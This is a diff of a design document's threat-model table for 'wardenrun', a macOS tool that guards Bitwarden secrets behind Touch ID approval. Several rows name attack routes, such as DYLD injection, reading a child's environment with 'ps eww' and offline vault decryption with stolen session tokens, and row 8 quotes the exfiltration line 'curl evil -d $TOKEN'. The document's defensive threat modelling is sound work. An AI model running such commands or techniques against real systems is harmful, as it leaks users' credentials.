@@ -416,13 +416,18 @@ later hardening.
 - **In the protected keychain item** (JSON blob): server URL, account e-mail, organization
   and allowed collection IDs, the master password, and the pinned `bw` identity (team
   ID and absolute path of the signed release).
-  Changing any of it goes through `wardenrun setup`, which needs the master password typed by
-  a human at a TTY plus an approval dialog that shows old and new values (threat 15).
+  Changing any of it goes through `wardenrun setup`, which needs the master password typed at
+  a terminal plus an approval dialog that shows old and new values (threat 15). A terminal is
+  not proof of a human (a script can open a pseudo-terminal): the Touch ID approval is the gate.
   The order inside `setup` is fixed and tested: validate the answers, approval (nothing has
   changed yet), copy `bw` and check the copy's signature, `bw logout` (a failure is ignored),
   `bw config server`, `bw login` with the password on an inherited pipe, unlock and lock as
-  proof, and **only then** save the item and write the audit event. A failure before the save
-  leaves the item as it was; the `bw` profile may have been logged out.
+  proof, and **only then** save the item and write the audit event. All of that happens in a
+  **staged** profile folder (`bw.staged-<uuid>` next to the live one) under `bw.lock`; only after
+  the proof is the staged folder renamed over the live one, so a failure at any step leaves the
+  item and the working profile as they were and the staged folder is deleted. The account must
+  log in with the password alone (two-step login is not supported yet), and the signing
+  certificate's revocation is not checked (no network call).
 - `wardenrun doctor`: prints tier, signature flags, hardening status, `bw` pin status,
   keychain item readability, Touch ID availability. No secrets. Server reachability is
   **deferred**: `doctor` makes no network call.
@@ -446,8 +451,8 @@ profile on disk.
 | 2 | Run `bw` or `security find-generic-password` | Denied | Keychain ACL bound to wardenrun's signing requirement: foreign certificate, ad-hoc and unsigned callers are refused (tests 7, 11). Session key never persisted. |
 | 3 | Run `wardenrun run X -- cmd` | Human decides | Full resolved command line (400-character cap, over-long commands are denied, never truncated), parent; executable hash and cwd in the audit log; one pending prompt at a time; 60 s timeout; lockout after repeated denials |
 | 4 | Fake the approval | Not possible | No clickable "Approve" exists. The only gesture is the system biometric sheet. Password fallback is off by default. No window server session (ssh, cron) means deny. |
-| 5 | Inject code into wardenrun (`DYLD_*`, debugger) | Blocked | Hardened runtime, `PT_DENY_ATTACH`, refuse to start with `DYLD_*` set (tested for `DYLD_INSERT_LIBRARIES`) |
-| 6 | Steer wardenrun into running a malicious `bw` (PATH, `NODE_OPTIONS`, edited config) and capture the master password | Blocked | `bw` is called by pinned absolute path; its identity (Bitwarden's Team ID signature; the Node build is refused, 5.2 rule 1) is stored in the protected item; its environment is built from an allowlist; on rung a/b of 5.2.6 the master password is not in env or argv |
+| 5 | Inject code into wardenrun (`DYLD_*`, debugger) | Blocked | Hardened runtime (dyld drops `DYLD_*` before the program starts; tested for `DYLD_INSERT_LIBRARIES`), `PT_DENY_ATTACH`; as a second line `setup`/`run`/`new` refuse (78) to start with `DYLD_*` set or from a release build without the hardened runtime (debug builds may run unhardened; no environment switch) |
+| 6 | Steer wardenrun into running a malicious `bw` (PATH, `NODE_OPTIONS`, edited config, replaced copy) and capture the master password | Mitigated | `bw` is called by pinned absolute path; its identity (Bitwarden's Team ID signature; the Node build is refused, 5.2 rule 1) is stored in the protected item; its environment is built from an allowlist; the copy is started suspended and the running process (not the path) is checked against the pinned signer, killed on mismatch; on rung a/b of 5.2.6 the master password is not in env or argv. Not covered: an older Bitwarden-signed release (no version floor), revocation (no network) |
 | 7 | Replace the `wardenrun` binary or alias it | **Not protected.** Install dirs are user-writable and a fake dialog can phish. | `wardenrun doctor` checks the signature requirement and install location; the README publishes the certificate hash and says to verify |
 | 8 | Approved command prints or sends the secret (`curl evil -d $TOKEN`, a script that logs it) | **Not protected** | That is why the dialog shows the full command line. Masking is an accident guard (raw, base64, URL, hex, JSON-escaped, shell-quoted), not an exfiltration barrier (`rev`, rot13, splitting beat it). |
 | 9 | Read the injected env of a running child with `ps eww` | **Not protected for env injection** (tested; ordinary binaries leak, Apple platform binaries do not) | Prefer `--stdin` for tools that support it; keep commands short-lived; documented. Temp-file mode has the same exposure while the file exists. |
@@ -456,7 +461,7 @@ profile on disk.
 | 12 | Steal the master password from wardenrun memory | Mitigated | `mlock`, zeroed after use, no core dumps, `PT_DENY_ATTACH` |
 | 13 | Compromise of the Mac's stored password | Blast radius limited | Dedicated vault account, one collection (section 3.4 point 3) |
 | 14 | Server impersonation | Mitigated | `https://` required (plain `http://` is refused by `bw`, even on loopback: tested, 5.2); `bw` verifies certificates |
-| 15 | Re-run `wardenrun setup` pointing at an attacker's server or account | Blocked | Needs the master password typed by a human at a TTY and an approval dialog showing old and new values |
+| 15 | Re-run `wardenrun setup` pointing at an attacker's server or account | Blocked | Needs the master password typed at a terminal and a Touch ID approval showing old and new values (a terminal is not proof of a human, the approval is the gate) |
 | 16 | While one approved run is in flight, read the master password or `BW_SESSION` from `bw`'s environment (`ps eww`; `bw` is not an Apple platform binary) and use `BW_SESSION` + `data.json` to decrypt the **whole cached collection** offline | **Not protected on rungs b and c** of 5.2.6: one approval can leak every item the dedicated account sees. Window of a few seconds, and it needs an agent polling `ps` at that moment. | Rung a (`bw serve` on a socketpair) removes both secrets from env and argv. The dedicated account bounds the damage to its one collection. This is the main reason PR3 starts with a spike. |
 | 17 | Read the access/refresh tokens (or API-key secret) from wardenrun's `bw` profile (`data.json`, mode `0600`, same user) and call the Vaultwarden API as the dedicated account | **Not protected.** Can read the encrypted vault (offline guessing of a strong master password is the next step), and delete or alter items the account may write. | Dedicated account; long random master password; Argon2id; read-only collection permission when `new` is not used; `logout_after_run`; password login instead of API key (no long-lived secret on disk) |
 | 18 | The maintainer's signing key leaks, or a malicious release is published | **Not protected for users who installed that release.** A binary signed with the leaked key passes the keychain ACL and could read the stored item after one approval. | Key only in a CI secret plus one offline backup; releases carry a GitHub Artifact Attestation and published hashes; certificate rotation procedure (everyone re-runs `setup`); `SECURITY.md` for reporting. Same trust anchor as any package maintainer. |
